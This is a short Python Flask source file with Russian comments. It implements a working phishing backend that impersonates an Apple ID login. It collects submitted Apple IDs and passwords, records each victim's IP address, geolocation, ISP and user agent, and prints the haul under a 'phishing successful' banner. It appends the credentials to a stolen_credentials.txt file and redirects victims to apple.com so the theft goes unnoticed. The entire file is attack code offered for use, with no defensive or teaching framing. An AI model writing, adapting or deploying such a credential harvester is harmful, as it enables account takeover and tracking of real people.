from flask import Flask, request, redirect
import datetime
import urllib.request
import json

app = Flask(__name__)

def get_client_ip():
    """Точное получение реального IP жертвы"""
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    elif request.headers.get("X-Real-IP"):
        return request.headers.get("X-Real-IP")
    return request.remote_addr

def get_geolocation(ip):
    """Новый API — FreeIPAPI (более стабильный на хостингах)"""
    try:
        url = f"https://freeipapi.com/api/json/{ip}"
        with urllib.request.urlopen(url, timeout=8) as response:
            data = json.loads(response.read().decode())
            
            return {
                "city": data.get("cityName", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "country": data.get("countryName", "Unknown"),
                "latitude": data.get("latitude"),
                "longitude": data.get("longitude"),
                "timezone": data.get("timeZone", "Unknown"),
                "isp": data.get("isp", "Unknown"),
                "org": data.get("organization", "Unknown")
            }
    except Exception as e:
        return {"error": f"API error: {str(e)}"}

@app.route('/')
def index():
    with open('index.html', 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/login', methods=['POST'])
def login():
    apple_id = request.form.get('apple_id')
    password = request.form.get('password')
    ip = get_client_ip()
    geo = get_geolocation(ip)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print("=" * 90)
    print(f"🚨 ФИШИНГ УСПЕШЕН! [{timestamp}]")
    print(f"IP-адрес жертвы     : {ip}")
    print(f"Город               : {geo.get('city', 'Unknown')}")
    print(f"Регион / Страна     : {geo.get('region', 'Unknown')} / {geo.get('country', 'Unknown')}")
    print(f"Координаты          : {geo.get('latitude')}, {geo.get('longitude')}")
    print(f"Часовой пояс        : {geo.get('timezone', 'Unknown')}")
    print(f"Провайдер (ISP)     : {geo.get('isp', 'Unknown')}")
    print(f"Организация         : {geo.get('org', 'Unknown')}")
    print(f"Apple ID            : {apple_id}")
    print(f"Пароль              : {password}")
    print(f"User-Agent          : {user_agent}")
    print("=" * 90)

    # Сохранение в файл
    with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] | IP: {ip} | City: {geo.get('city','Unknown')} | Country: {geo.get('country','Unknown')} | "
                f"Apple ID: {apple_id} | Password: {password}\n")

    return redirect('https://www.apple.com')

if __name__ == '__main__':
    print("✅ Сервер запущен!")
    app.run(debug=True, port=5000)
